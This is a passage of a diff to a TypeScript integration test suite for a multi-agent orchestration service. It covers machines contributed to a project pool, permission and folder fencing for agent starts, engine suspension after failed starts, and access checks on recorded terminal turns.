 describe('Super Tabs on a real Mongo replica set', () => {
-  it('records a grid worker\'s model on every assignment, after its start is finished and no longer loaded', async () => {
-    // Review of #1808: the run read the start, which a command does not load once the start is finished, so an assigned or
-    // reused Kimi worker counted as a subscription run.
-    const tab = (await store.create(owner, randomUUID(), 'Grid pool')).id
-    const invitation = await run(tab, { type: 'invite.create', email: host.email, role: 'collaborator', conversationId: 'lead' })
-    await run(tab, { type: 'invite.accept', inviteId: invitation.result.inviteId as string }, host)
-    await db.machine.create({ data: { machineId: 'grid-host', userId: host.sub, apiKey: 'fixture-grid-host', managerId: 'fixture', autonomousEnv: 'prod', authMode: 'remote' } })
-    const team = await teamMachine('grid-host')
-    await run(tab, { type: 'machine.contribute', machineId: 'grid-host', name: 'Grid laptop', cwd: '/project', engines: ['claude'], maxAgents: 2 }, host)
-    const grid = (await store.read(owner, tab)).state.localModels!.grid
-    const generation = (await poolRows(store, team.session, 'grid-host'))[0]!.machine.generation
-    await store.observeMachine(team.session, tab, 'grid-host', { generation, resources: { cpuPercent: 10, memoryTotalBytes: 32e9, memoryUsedBytes: 4e9,
-      diskFreeBytes: 120e9, diskTotalBytes: 500e9, projectDiskFreeBytes: 120e9, deviceType: 'Laptop', chip: 'Fixture CPU', os: 'macOS', gpuPercent: null },
-      quotas: [], tools: { git: true }, runningHarnessIds: [], stoppedHarnessIds: [], privacy: team.privacy,
-      localModels: [{ grid, model: 'moonshotai/kimi-k3', name: 'Kimi K3', kind: 'api' }] })
-    const group = String((await run(tab, { type: 'conversation.create', title: 'Small fix', brief: 'Fix it.',
-      checks: [{ description: 'Independent review', independent: true }] })).result.conversationId)
-    const startId = String((await run(tab, { type: 'agent.start', request: { conversationId: group, machineId: 'grid-host', engine: 'claude', name: 'Builder',
-      cwd: '/project', worktree: true, gridModel: 'moonshotai/kimi-k3', gridName: grid,
-      requirements: { memoryBytes: 0, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } } })).result.startId)
-    const hostRun = (command: Command) => store.execute(team.session, tab, { operationId: randomUUID(), command }, undefined, 'grid-host')
-    await hostRun({ type: 'agent.startDispatch', startId })
-    const agentId = String((await hostRun({ type: 'agent.started', startId, harnessId: 'grid-builder',
-      configuration: { engine: 'claude', model: null, effort: null, contextWindow: null, engineVersion: null } })).result.agentId)
-    await hostRun({ type: 'agent.startSettled', startId, warning: null })
-    const runs = async () => (await storedState(tab)).conversations.find(c => c.id === group)!.ledger!.runs!.map(r => [r.model, r.grid])
-    await run(tab, { type: 'work.assign', conversationId: group, agentId })
-    expect(await runs()).toEqual([['moonshotai/kimi-k3', true]])
-    const first = (await store.read(owner, tab)).state.conversations.find(c => c.id === group)!.assignment!.id
-    await run(tab, { type: 'work.cancel', conversationId: group, assignmentId: first, reason: 'Again.' })
-    await run(tab, { type: 'work.assign', conversationId: group, agentId })
-    expect(await runs()).toEqual([['moonshotai/kimi-k3', true], ['moonshotai/kimi-k3', true]])
-  })
-
-  it('rates a Reviewer launched on its engine\'s default by the default row after it reports its model, its start finished', async () => {
-    // Live bug 10-29: a command does not load a finished start, so a Codex Reviewer that reported gpt-6.1-sol was rated 1.
-    const tab = (await store.create(owner, randomUUID(), 'Default pool')).id
-    const invitation = await run(tab, { type: 'invite.create', email: host.email, role: 'collaborator', conversationId: 'lead' })
-    await run(tab, { type: 'invite.accept', inviteId: invitation.result.inviteId as string }, host)
-    await db.machine.create({ data: { machineId: 'default-host', userId: host.sub, apiKey: 'fixture-default-host', managerId: 'fixture', autonomousEnv: 'prod', authMode: 'remote' } })
-    const team = await teamMachine('default-host')
-    await run(tab, { type: 'machine.contribute', machineId: 'default-host', name: 'Default laptop', cwd: '/project', engines: ['codex'], maxAgents: 2 }, host)
-    const generation = (await poolRows(store, team.session, 'default-host'))[0]!.machine.generation
-    await store.observeMachine(team.session, tab, 'default-host', { generation, resources: { cpuPercent: 10, memoryTotalBytes: 32e9, memoryUsedBytes: 4e9,
-      diskFreeBytes: 120e9, diskTotalBytes: 500e9, projectDiskFreeBytes: 120e9, deviceType: 'Laptop', chip: 'Fixture CPU', os: 'macOS', gpuPercent: null },
-      quotas: [], tools: { git: true }, runningHarnessIds: [], stoppedHarnessIds: [], privacy: team.privacy })
-    const group = String((await run(tab, { type: 'conversation.create', title: 'Fix', brief: 'Fix it.',
-      checks: [{ description: 'Independent review', independent: true }] })).result.conversationId)
-    const review = async () => String((await run(tab, { type: 'conversation.create', title: 'Review', brief: 'Review it.', reviewOf: group,
-      checks: [{ description: 'Verdict', independent: false }] })).result.conversationId)
-    const first = await review()
-    const startId = String((await run(tab, { type: 'agent.start', request: { conversationId: first, role: 'reviewer', machineId: 'default-host', engine: 'codex',
-      name: 'Reviewer', cwd: '/project', worktree: true, requirements: { memoryBytes: 0, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } } })).result.startId)
-    const hostRun = (command: Command) => store.execute(team.session, tab, { operationId: randomUUID(), command }, undefined, 'default-host')
-    await hostRun({ type: 'agent.startDispatch', startId })
-    const agentId = String((await hostRun({ type: 'agent.started', startId, harnessId: 'default-reviewer',
-      configuration: { engine: 'codex', model: null, effort: null, contextWindow: null, engineVersion: null } })).result.agentId)
-    await hostRun({ type: 'agent.startSettled', startId, warning: null })
-    const assign = async (conversationId: string) => (await run(tab, { type: 'work.assign', conversationId, agentId })).result.warnings
-    expect(await assign(first)).toBeUndefined()
-    const previousVersion = (await storedState(tab)).agents.find(a => a.id === agentId)!.configurationVersion!
-    await run(tab, { type: 'agent.configuration', previousVersion, configuration: { engine: 'codex', model: 'gpt-6.1-sol', effort: null, contextWindow: null, engineVersion: null } }, team.session, agentId)
-    const firstWork = (await store.read(owner, tab)).state.conversations.find(c => c.id === first)!.assignment!.id
-    await run(tab, { type: 'work.cancel', conversationId: first, assignmentId: firstWork, reason: 'Again.' })
-    expect(await assign(await review())).toBeUndefined()
-  })
-
-  it('tells a contributed machine its start\'s project skills, which its host cannot read from the Swarm', async () => {
+  it('tells a contributed machine its start\'s skills are Default, for a host from before #3912', async () => {
+    // Swarm v3 (task #4120): the machine is its person's own, who starts its agents, in their own account.
     // Prod logs 2026-10-28: the host asked for a Swarm status read it may not make (a 400 at every start), then launched
     // every agent on Harness orchestration, whatever its project ran.
     const tab = (await store.create(owner, randomUUID(), 'Skills pool')).id
     const invitation = await run(tab, { type: 'invite.create', email: host.email, role: 'collaborator', conversationId: 'lead' })
     await run(tab, { type: 'invite.accept', inviteId: invitation.result.inviteId as string }, host)
     await db.machine.create({ data: { machineId: 'skills-host', userId: host.sub, apiKey: 'fixture-skills-host', managerId: 'fixture', autonomousEnv: 'prod', authMode: 'remote' } })
-    const team = await teamMachine('skills-host')
     await run(tab, { type: 'machine.contribute', machineId: 'skills-host', name: 'Skills laptop', cwd: '/project', engines: ['claude'], maxAgents: 4 }, host)
-    const generation = (await poolRows(store, team.session, 'skills-host'))[0]!.machine.generation
-    await store.observeMachine(team.session, tab, 'skills-host', { generation, resources: { cpuPercent: 10, memoryTotalBytes: 32e9, memoryUsedBytes: 4e9,
+    const generation = (await poolRows(store, host, 'skills-host'))[0]!.machine.generation
+    await store.observeMachine(host, tab, 'skills-host', { generation, resources: { cpuPercent: 10, memoryTotalBytes: 32e9, memoryUsedBytes: 4e9,
       diskFreeBytes: 120e9, diskTotalBytes: 500e9, projectDiskFreeBytes: 120e9, deviceType: 'Laptop', chip: 'Fixture CPU', os: 'macOS', gpuPercent: null },
-      quotas: [], tools: { git: true }, runningHarnessIds: [], stoppedHarnessIds: [], privacy: team.privacy })
-    const start = async () => String((await run(tab, { type: 'agent.start', request: { conversationId: 'lead', machineId: 'skills-host', engine: 'claude',
+      quotas: [], tools: { git: true }, runningHarnessIds: [], stoppedHarnessIds: [] })
+    // Started in a task: the project chat holds only its coordinator among agents (#2207).
+    const task = String((await run(tab, { type: 'conversation.create', title: 'Skills work', brief: '', checks: [] })).result.conversationId)
+    const start = async () => String((await asHost(tab, { type: 'agent.start', request: { conversationId: task, machineId: 'skills-host', engine: 'claude',
       name: 'Builder', cwd: '/project', worktree: true,
       requirements: { memoryBytes: 0, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } } })).result.startId)
-    const skillMode = async (startId: string) => (await store.start(team.session, tab, startId, undefined, 'skills-host')).skillMode
+    const skillMode = async (startId: string) => (await store.start(host, tab, startId, undefined, 'skills-host')).skillMode
 
-    expect(await skillMode(await start())).toBe('default')
-    // What an older client stored before project instructions: the host still reads it.
-    await seedProject(tab, 'lead', { skillSet: 'orchestration', skillMode: 'orchestration' })
-    expect(await skillMode(await start())).toBe('orchestration')
-    await seedProject(tab, 'lead', { skillSet: 'custom', skillMode: 'default' }, [{ id: 'lead', name: 'Product Manager', kind: 'lead', text: 'LEAD' },
-      { id: 'dev', name: 'Engineer', kind: 'builder', text: 'DEV' }, { id: 'review', name: 'Reviewer', kind: 'reviewer', text: 'REVIEW' }])
-    // A Custom set is the Default skills with the owner's role text, which the agent reads after it joins.
     expect(await skillMode(await start())).toBe('default')
   })
 
   it('contributes project capacity without sharing the computer and fences host execution', async () => {
+    // Swarm v3 (task #4120): the machine is its person's own, who starts its agents, in their own account.
     const tab = (await store.create(owner, randomUUID(), 'Machine pool')).id
     const invitation = await run(tab, { type: 'invite.create', email: host.email, role: 'collaborator', conversationId: 'lead' })
     await run(tab, { type: 'invite.accept', inviteId: invitation.result.inviteId as string }, host)
     const contribute = { type: 'machine.contribute' as const, machineId: 'pool-host', name: 'Host laptop', cwd: '/project', engines: ['codex' as const], maxAgents: 1 }
     await db.machine.create({ data: { machineId: 'pool-host', userId: host.sub, apiKey: 'fixture-pool-only', managerId: 'fixture', autonomousEnv: 'prod', authMode: 'remote' } })
-    const team = await teamMachine('pool-host')
     await expect(run(tab, contribute)).rejects.toMatchObject({ code: 'HOST_REQUIRED' })
     await run(tab, contribute, host)
     expect(await db.machineShare.findUnique({ where: { machineId: 'pool-host' } })).toBeNull()
-    const pools = await poolRows(store, team.session, 'pool-host')
+    const pools = await poolRows(store, host, 'pool-host')
     expect(pools).toHaveLength(1)
     const generation = pools[0]!.machine.generation
     const observation = { generation, resources: { cpuPercent: 10, memoryTotalBytes: 32e9, memoryUsedBytes: 4e9, diskFreeBytes: 120e9, diskTotalBytes: 500e9,
       projectDiskFreeBytes: 120e9, deviceType: 'Laptop', chip: 'Fixture CPU', os: 'macOS', gpuPercent: null }, quotas: [], tools: { git: true }, runningHarnessIds: [], stoppedHarnessIds: [] }
     await expect(store.observeMachine(owner, tab, 'pool-host', observation)).rejects.toMatchObject({ code: 'CONTRIBUTION_REVOKED' })
-    await store.observeMachine(team.session, tab, 'pool-host', { ...observation, privacy: team.privacy })
-    const request = { permissionMode: 'full', conversationId: 'lead', machineId: 'pool-host', engine: 'codex', name: 'Builder', cwd: '/project', worktree: true,
-      requirements: { memoryBytes: 0, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } }
-    await expect(run(tab, { type: 'agent.start', request: { ...request, cwd: '/private' } })).rejects.toMatchObject({ code: 'OUTSIDE_CONTRIBUTION' })
-    await expect(run(tab, { type: 'agent.start', request: { ...request, permissionMode: 'bypassPermissions' } })).rejects.toMatchObject({ code: 'OUTSIDE_CONTRIBUTION' })
-    const starts = await Promise.allSettled([run(tab, { type: 'agent.start', request }), run(tab, { type: 'agent.start', request })])
+    await store.observeMachine(host, tab, 'pool-host', { ...observation })
+    // Started and assigned in a task: the project chat holds only its coordinator among agents (#2207).
+    const task = String((await run(tab, { type: 'conversation.create', title: 'Pool work', brief: '', checks: [] })).result.conversationId)
+    const request = { conversationId: task, machineId: 'pool-host', engine: 'codex', name: 'Builder', cwd: '/project', worktree: true,
+      // 15 GiB each, with 28 GB free: room for one (saved counts hold no start back since 2026-11-10).
+      requirements: { memoryBytes: 15 * 1024 ** 3, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } }
+    await expect(asHost(tab, { type: 'agent.start', request: { ...request, cwd: '/private' } })).rejects.toMatchObject({ code: 'OUTSIDE_CONTRIBUTION' })
+    await expect(asHost(tab, { type: 'agent.start', request: { ...request, permissionMode: 'full' } })).rejects.toMatchObject({ code: 'OUTSIDE_CONTRIBUTION' })
+    const starts = await Promise.allSettled([asHost(tab, { type: 'agent.start', request }), asHost(tab, { type: 'agent.start', request })])
     expect(starts.filter(r => r.status === 'fulfilled')).toHaveLength(1)
     expect(starts.filter(r => r.status === 'rejected')).toHaveLength(1)
     const startId = (starts.find(r => r.status === 'fulfilled') as PromiseFulfilledResult<Awaited<ReturnType<typeof run>>>).value.result.startId as string
-    const queued = await store.start(owner, tab, startId)
+    const queued = await store.start(host, tab, startId)
     expect(queued.poolGeneration).toBe(generation)
-    expect(queued.request.permissionMode).toBe('full')
+    // Swarm v3 (#4215): the agent starts with its owner's own settings.
+    expect(queued.request).not.toHaveProperty('permissionMode')
     await expect(run(tab, { type: 'agent.startDispatch', startId })).rejects.toMatchObject({ code: 'HOST_REQUIRED' })
     await expect(store.start(peer, tab, startId, undefined, 'pool-host')).rejects.toMatchObject({ code: 'FORBIDDEN' })
-    const hostRun = (command: Command) => store.execute(team.session, tab, { operationId: randomUUID(), command }, undefined, 'pool-host')
+    const hostRun = (command: Command) => store.execute(host, tab, { operationId: randomUUID(), command }, undefined, 'pool-host')
     await expect(hostRun(message('Not a generic proxy'))).rejects.toMatchObject({ code: 'FORBIDDEN' })
     await run(tab, { type: 'machine.pause', machineId: 'pool-host', paused: true }, host)
     await expect(hostRun({ type: 'agent.startDispatch', startId })).rejects.toMatchObject({ code: 'MACHINE_PAUSED' })
@@ -1069,56 +732,62 @@ describe('Super Tabs on a real Mongo replica set', () => {
     await hostRun({ type: 'agent.startDispatch', startId })
     await expect(hostRun({ type: 'agent.startDispatch', startId })).rejects.toMatchObject({ code: 'START_CLAIMED' })
     await hostRun({ type: 'agent.started', startId, harnessId: 'pool-builder', configuration: config })
-    const pendingAgent = (await store.read(owner, tab)).state.agents[0]!
-    await expect(run(tab, { type: 'work.assign', conversationId: 'lead', agentId: pendingAgent.id })).rejects.toMatchObject({ code: 'START_PENDING' })
     await expect(run(tab, contribute, host)).rejects.toMatchObject({ code: 'STARTS_PENDING' })
     await expect(run(tab, { type: 'agent.startSettled', startId, warning: null })).rejects.toMatchObject({ code: 'HOST_REQUIRED' })
     await hostRun({ type: 'agent.startSettled', startId, warning: null })
-    expect((await store.start(owner, tab, startId)).poolSettled).toBe(true)
+    expect((await store.start(host, tab, startId)).poolSettled).toBe(true)
     expect((await store.read(owner, tab)).state.agents[0]).toMatchObject({ contributorId: host.sub, machineOwnerId: host.sub, harnessId: 'pool-builder' })
     await run(tab, { type: 'member.remove', userId: host.sub })
-    expect(await poolRows(store, team.session, 'pool-host')).toEqual([])
+    expect(await poolRows(store, host, 'pool-host')).toEqual([])
     // The machine stays listed while its host cleans up, but its owner left: a reading is refused as theirs no longer.
-    await expect(store.observeMachine(team.session, tab, 'pool-host', observation)).rejects.toMatchObject({ code: 'FORBIDDEN' })
-    await expect(store.start(team.session, tab, startId, undefined, 'pool-host')).rejects.toMatchObject({ code: 'FORBIDDEN' })
+    await expect(store.observeMachine(host, tab, 'pool-host', observation)).rejects.toMatchObject({ code: 'FORBIDDEN' })
+    await expect(store.start(host, tab, startId, undefined, 'pool-host')).rejects.toMatchObject({ code: 'FORBIDDEN' })
   })
 
   // Ken, 2026-10-28: work kept landing on engines that could not run on their machine. Two failed starts suspend the engine
   // there, saved with the machine; a reading that shows it signed in with quota, or its owner, offers it again.
   it('suspends an engine after two failed starts on a machine, keeps why its allowance is unknown, and offers it again', async () => {
+    // Swarm v3 (task #4120): the machine is its person's own, who starts its agents, in their own account.
     const tab = (await store.create(owner, randomUUID(), 'Engine health')).id
     const invitation = await run(tab, { type: 'invite.create', email: host.email, role: 'collaborator', conversationId: 'lead' })
     await run(tab, { type: 'invite.accept', inviteId: invitation.result.inviteId as string }, host)
     await db.machine.create({ data: { machineId: 'health-host', userId: host.sub, apiKey: 'fixture-health-only', managerId: 'fixture', autonomousEnv: 'prod', authMode: 'remote' } })
-    const team = await teamMachine('health-host')
-    await run(tab, { type: 'machine.contribute', machineId: 'health-host', name: 'Health laptop', cwd: '/project', engines: ['codex'], maxAgents: 2 }, host)
-    const generation = (await poolRows(store, team.session, 'health-host'))[0]!.machine.generation
+    await run(tab, { type: 'machine.contribute', machineId: 'health-host', name: 'Health laptop', cwd: '/project', engines: ['codex', 'claude'], maxAgents: 2 }, host)
+    const generation = (await poolRows(store, host, 'health-host'))[0]!.machine.generation
     const observation = { generation, resources: { cpuPercent: 10, memoryTotalBytes: 32e9, memoryUsedBytes: 4e9, diskFreeBytes: 120e9, diskTotalBytes: 500e9,
       projectDiskFreeBytes: 120e9, deviceType: 'Laptop', chip: 'Fixture CPU', os: 'macOS', gpuPercent: null }, tools: { git: true }, runningHarnessIds: [], stoppedHarnessIds: [],
-      privacy: team.privacy, quotas: [{ engine: 'codex', known: false, windows: [] }], quotaReasons: { codex: 'OpenAI could not be reached.' } }
-    await store.observeMachine(team.session, tab, 'health-host', observation)
+      quotas: [{ engine: 'codex', known: false, windows: [] }], quotaReasons: { codex: 'OpenAI could not be reached.' } }
+    await store.observeMachine(host, tab, 'health-host', observation)
     const pool = async () => (await store.read(owner, tab)).state.machines!.find(m => m.machineId === 'health-host')! as Record<string, any>
     expect((await pool()).observation.quotaReasons).toEqual({ codex: 'OpenAI could not be reached.' })
-    const request = { permissionMode: 'full', conversationId: 'lead', machineId: 'health-host', engine: 'codex', name: 'Builder', cwd: '/project', worktree: true,
+    // Started in a task: the project chat holds only its coordinator among agents (#2207).
+    const task = String((await run(tab, { type: 'conversation.create', title: 'Health work', brief: '', checks: [] })).result.conversationId)
+    const request = { conversationId: task, machineId: 'health-host', engine: 'codex', name: 'Builder', cwd: '/project', worktree: true,
       requirements: { memoryBytes: 0, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } }
-    const hostRun = (command: Command) => store.execute(team.session, tab, { operationId: randomUUID(), command }, undefined, 'health-host')
+    const hostRun = (command: Command) => store.execute(host, tab, { operationId: randomUUID(), command }, undefined, 'health-host')
+    // Preparation failures remain failed starts, but do not disable either engine.
     for (let i = 0; i < 2; i++) {
-      const startId = (await run(tab, { type: 'agent.start', request })).result.startId as string
+      const startId = (await asHost(tab, { type: 'agent.start', request })).result.startId as string
+      await hostRun({ type: 'agent.startFailed', startId, error: 'The Harness server answered without a GitHub token for this project.' })
+    }
+    expect((await pool()).suspendedEngines).toBeUndefined()
+    for (let i = 0; i < 2; i++) {
+      const startId = (await asHost(tab, { type: 'agent.start', request })).result.startId as string
       await hostRun({ type: 'agent.startDispatch', startId })
-      await hostRun({ type: 'agent.startFailed', startId, error: 'Codex could not launch.' })
+      await hostRun({ type: 'agent.startFailed', startId, error: 'Codex sign-in failed.' })
     }
     expect((await pool()).suspendedEngines).toEqual({ codex: expect.stringContaining('Codex is suspended on this machine for new work') })
-    const notices = (await store.messages(owner, tab, 'lead', {})).messages.filter(m => m.text.includes('Codex is suspended'))
+    const notices = (await store.messages(owner, tab, task, {})).messages.filter(m => m.text.includes('Codex is suspended'))
     expect(notices.map(m => m.mentions)).toEqual([[host.sub]])
-    await expect(run(tab, { type: 'agent.start', request })).rejects.toMatchObject({ code: 'ENGINE_UNAVAILABLE' })
-    // Signed in, with quota left: the reading offers it again.
-    await store.observeMachine(team.session, tab, 'health-host', { ...observation, quotaReasons: undefined,
-      quotas: [{ engine: 'codex', known: true, windows: [{ name: 'weekly', usedPercent: 10, resetsAt: null }] }],
+    await expect(asHost(tab, { type: 'agent.start', request })).rejects.toMatchObject({ code: 'ENGINE_UNAVAILABLE' })
+    // Signed in, even with unknown quota: a sign-in suspension ends.
+    await store.observeMachine(host, tab, 'health-host', { ...observation, quotaReasons: undefined,
+      quotas: [{ engine: 'codex', known: false, windows: [] }],
       readiness: { engines: [{ engine: 'codex', installed: true, signedIn: true }] } })
     expect((await pool()).suspendedEngines).toBeUndefined()
     // Suspended again, and resumed by its owner.
     for (let i = 0; i < 2; i++) {
-      const startId = (await run(tab, { type: 'agent.start', request })).result.startId as string
+      const startId = (await asHost(tab, { type: 'agent.start', request })).result.startId as string
       await hostRun({ type: 'agent.startDispatch', startId })
       await hostRun({ type: 'agent.startFailed', startId, error: 'Codex could not launch.' })
     }
@@ -1126,6 +795,23 @@ describe('Super Tabs on a real Mongo replica set', () => {
     await expect(run(tab, { type: 'machine.engineResume', machineId: 'health-host', engine: 'codex' })).rejects.toMatchObject({ code: 'OWNER_REQUIRED' })
     await run(tab, { type: 'machine.engineResume', machineId: 'health-host', engine: 'codex' }, host)
     expect((await pool()).suspendedEngines).toBeUndefined()
+    // Timeouts of different engines share one machine cooldown, persisted across reports and reads.
+    for (const engine of ['codex', 'claude']) {
+      const startId = (await asHost(tab, { type: 'agent.start', request: { ...request, engine } })).result.startId as string
+      await hostRun({ type: 'agent.startDispatch', startId })
+      await hostRun({ type: 'agent.startFailed', startId, error: 'Health laptop did not start it within 3 minutes' })
+    }
+    await store.observeMachine(host, tab, 'health-host', observation)
+    expect(await pool()).toMatchObject({ machineSuspended: expect.stringContaining('This machine is suspended'),
+      suspendedEngines: { codex: expect.stringContaining('This machine is suspended'), claude: expect.stringContaining('This machine is suspended') } })
+    for (const engine of ['codex', 'claude']) {
+      await expect(asHost(tab, { type: 'agent.start', request: { ...request, engine } })).rejects.toMatchObject({ code: 'MACHINE_UNAVAILABLE' })
+    }
+    await expect(run(tab, { type: 'machine.engineResume', machineId: 'health-host', engine: 'codex' })).rejects.toMatchObject({ code: 'OWNER_REQUIRED' })
+    await run(tab, { type: 'machine.engineResume', machineId: 'health-host', engine: 'codex' }, host)
+    expect((await pool()).machineSuspended).toBeUndefined()
+    expect((await pool()).suspendedEngines).toBeUndefined()
+    expect((await asHost(tab, { type: 'agent.start', request })).result.startId).toBeTruthy()
   })
 
   it('resolves a reply beyond recent history without crossing conversation or membership boundaries', async () => {
@@ -1152,114 +838,9 @@ describe('Super Tabs on a real Mongo replica set', () => {
     expect(removed.json().error.code).toBe('NOT_FOUND')
   })
 
-  it('records native turns once, in order, with verified source metadata and no input echo', async () => {
-    const { tab, lead } = await fixture()
-    await invite(tab)
-    // Only the Lead's machine's owner drives it (terminal.ts mayDrive); the execution host alone records and reads it.
-    await joinHost(tab)
-    const request = { operationId: randomUUID(), conversationId: 'lead', agentId: lead }
-    const { contextId } = await store.native.open(host, tab, request)
-    expect(await store.native.open(host, tab, request)).toEqual({ contextId })
-    await expect(store.native.read(peer, tab, contextId)).rejects.toMatchObject({ code: 'FORBIDDEN' })
-    expect(await store.native.read(host, tab, contextId)).toMatchObject({ agentId: lead, machineId: 'test-host',
-      operator: { id: host.sub, kind: 'person' }, lastEventId: null })
-    const prompt = { turnId: randomUUID(), kind: 'prompt' as const, previousEventId: null,
-      text: 'A native intervention', truncated: false, interrupted: false }
-    await expect(store.native.append(owner, tab, contextId, prompt)).rejects.toMatchObject({ code: 'FORBIDDEN' })
-    const posted = await Promise.all(Array.from({ length: 3 }, () => store.native.append(host, tab, contextId, prompt)))
-    expect(posted[1]).toEqual(posted[0])
-    await expect(store.native.append(host, tab, contextId, { ...prompt, text: 'Changed content' })).rejects.toMatchObject({ code: 'OPERATION_REUSED' })
-    const first = posted[0] as { eventId: string }
-    const answer = { ...prompt, kind: 'answer' as const, text: 'A native answer', interrupted: true }
-    await expect(store.native.append(host, tab, contextId, answer)).rejects.toMatchObject({ code: 'NATIVE_ORDER_CHANGED' })
-    await expect(store.native.append(host, tab, contextId, { ...answer, turnId: randomUUID(), previousEventId: first.eventId }))
-      .rejects.toMatchObject({ code: 'NATIVE_PROMPT_MISSING' })
-    const second = await store.native.append(host, tab, contextId, { ...answer, previousEventId: first.eventId })
-    expect(await store.native.append(host, tab, contextId, prompt)).toEqual(first)
-    const rows = (await store.messages(owner, tab, 'lead', {})).messages
-    expect(rows).toHaveLength(2)
-    expect(rows[0]).toMatchObject({ text: prompt.text, author: { kind: 'agent', id: lead },
-      source: { kind: 'native', phase: 'prompt', operator: { id: host.sub, kind: 'person' } } })
-    expect(rows[1]).toMatchObject({ replyTo: first.eventId, text: answer.text, source: { interrupted: true, phase: 'answer' } })
-    expect(rows[0]!.source).not.toHaveProperty('contextId')
-    expect(rows[1]!.sequence).toBeGreaterThan(rows[0]!.sequence)
-    expect((await store.native.read(host, tab, contextId)).lastEventId).toBe((second as { eventId: string }).eventId)
-    expect(await store.deliveries(host, tab, lead)).toEqual([])
-    const forged = await app.inject({ method: 'POST', url: `/api/super-tabs/${tab}/native/${contextId}`,
-      headers: { authorization: `Bearer ${host.sub}` }, payload: { ...prompt, operator: { id: owner.sub } } })
-    expect(forged.statusCode).toBe(400)
-  })
-
-  it('keeps native observations in the chosen group, tells its coordinator only of a gap, and never revives a withdrawn context', async () => {
-    const { tab, lead } = await fixture()
-    const group = (await run(tab, { type: 'conversation.create', title: 'Implementation', brief: '', checks: [] })).result.conversationId as string
-    const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Builder', configuration: config, lead: false })).result.agentId as string
-    const request = { operationId: randomUUID(), conversationId: group, agentId: worker }
-    const { contextId } = await store.native.open(owner, tab, request)
-    await expect(store.native.open(owner, tab, { ...request, conversationId: 'lead' })).rejects.toMatchObject({ code: 'AGENT_UNAVAILABLE' })
-    const event = { turnId: randomUUID(), kind: 'prompt' as const, previousEventId: null,
-      text: 'Change this implementation', truncated: false, interrupted: false }
-    const typed = await store.native.append(host, tab, contextId, event) as { eventId: string }
-    expect((await store.messages(owner, tab, 'lead', {})).messages).toHaveLength(0)
-    expect((await store.messages(owner, tab, group, {})).messages).toHaveLength(1)
-    expect(await store.deliveries(host, tab, worker)).toEqual([])
-    // A typed prompt names no one (project instructions, phase 4): the coordinator hears only of a gap on the task.
-    expect(await store.deliveries(host, tab, lead)).toEqual([])
-    const receipt = await gapToCoordinator(tab, group, worker, contextId, typed.eventId)
-    const notifications = (await store.deliveries(host, tab, lead)).filter(d => d.nativeContextId === contextId)
-    expect(notifications).toHaveLength(1)
-    expect(notifications[0]).toMatchObject({ conversationId: group, nativeContextId: contextId, messageId: receipt.eventId })
-    await run(tab, { type: 'work.cancel', conversationId: group, assignmentId: (await storedState(tab)).conversations.find(c => c.id === group)!.assignment!.id, reason: 'Moved.' })
-    await run(tab, { type: 'conversation.agent', conversationId: group, agentId: worker, present: false, lead: false })
-    await run(tab, { type: 'conversation.agent', conversationId: group, agentId: worker, present: true, lead: false })
-    await expect(store.native.read(host, tab, contextId)).rejects.toMatchObject({ code: 'NATIVE_CONTEXT_REVOKED' })
-    await expect(store.native.open(owner, tab, request)).rejects.toMatchObject({ code: 'NATIVE_CONTEXT_REVOKED' })
-    expect((await store.deliveries(host, tab, lead)).filter(d => d.nativeContextId === contextId)).toEqual([])
-    expect((await db.superTabDelivery.findUnique({ where: { id: notifications[0]!.id } }))!.status).toBe('cancelled')
-    expect(await store.native.open(owner, tab, { ...request, operationId: randomUUID() })).not.toEqual({ contextId })
-  })
-
-  it('requires machine control as well as collaboration and fences removal, re-invitation and changed machine grants', async () => {
-    const { tab } = await fixture()
-    await invite(tab, 'viewer')
-    // A member's terminal on a Builder: only its machine's owner drives a Lead (terminal.ts mayDrive).
-    const group = String((await run(tab, { type: 'conversation.create', title: 'Build', brief: '', checks: [] })).result.conversationId)
-    const worker = String((await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Builder', configuration: config, lead: false })).result.agentId)
-    const request = { operationId: randomUUID(), conversationId: group, agentId: worker }
-    await expect(store.native.open(peer, tab, request)).rejects.toMatchObject({ code: 'READ_ONLY' })
-    await run(tab, { type: 'member.remove', userId: peer.sub })
-    await invite(tab)
-    const { contextId } = await store.native.open(peer, tab, request)
-    const event = { turnId: randomUUID(), kind: 'gap' as const, previousEventId: null,
-      text: 'Caller text must not impersonate a gap explanation', truncated: false, interrupted: false }
-    await store.native.append(host, tab, contextId, event)
-    expect((await store.messages(owner, tab, group, {})).messages[0]!.text).toContain('Some terminal activity could not be recorded')
-    const original = (await db.machineShare.findUnique({ where: { machineId: 'test-host' } }))!
-    await db.machineShare.update({ where: { machineId: 'test-host' }, data: { emails: [owner.email],
-      grantVersions: nextMachineShareGrants(original, [owner.email], null) } })
-    try {
-      await expect(store.native.open(peer, tab, { ...request, operationId: randomUUID() })).rejects.toMatchObject({ code: 'HOST_REQUIRED' })
-      await expect(store.native.read(host, tab, contextId)).rejects.toMatchObject({ code: 'HOST_REQUIRED' })
-      await db.machineShare.update({ where: { machineId: 'test-host' }, data: {
-        emails: original.emails, grantVersions: nextMachineShareGrants({ ...original, emails: [owner.email] }, original.emails, null),
-      } })
-      await expect(store.native.read(host, tab, contextId)).rejects.toMatchObject({ code: 'NATIVE_CONTEXT_REVOKED' })
-    } finally {
-      const current = await db.machineShare.findUniqueOrThrow({ where: { machineId: 'test-host' } })
-      await db.machineShare.update({ where: { machineId: 'test-host' }, data: { emails: original.emails,
-        grantVersions: nextMachineShareGrants(current, original.emails, null) } })
-    }
-    await run(tab, { type: 'member.remove', userId: peer.sub })
-    await invite(tab)
-    await expect(store.native.read(host, tab, contextId)).rejects.toMatchObject({ code: 'NATIVE_CONTEXT_REVOKED' })
-  })
-
   it('keeps an ordered configuration history, rejects stale observations and authorizes the execution host alone', async () => {
     const { tab, lead } = await fixture()
-    await run(tab, { type: 'work.define', conversationId: 'lead', brief: 'A measured result', checks: [{ description: 'Verified evidence', independent: false }] })
